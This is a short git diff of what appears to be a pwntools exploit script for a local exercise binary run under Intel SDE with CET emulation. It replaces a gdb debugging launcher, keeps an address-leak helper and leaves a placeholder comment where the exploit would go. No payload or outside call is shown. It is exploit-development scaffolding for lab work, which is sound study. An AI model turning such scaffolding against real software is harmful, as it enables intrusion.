@@ -9,16 +9,22 @@ def extract_address(s):
     return struct.unpack("<Q", leaked_bytes[:-1].ljust(8, b"\x00"))[0]
 
 
-# target = process("./bin/ex1")
-
-context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
-io = gdb.debug(
-    "./bin/ex1",
-    """
-    break ex1.c:63
-    c
-    """,
+target = process(
+    "./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1",
+    shell=True,
 )
+
+# exploit the world here
+
+# context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
+# io = gdb.debug(
+#     "./bin/ex1",
+#     """
+#     break ex1.c:63
+#     c
+#     """,
+# )
+io = target
 
 print("--", io.recvline())
 print("--", io.recvline())
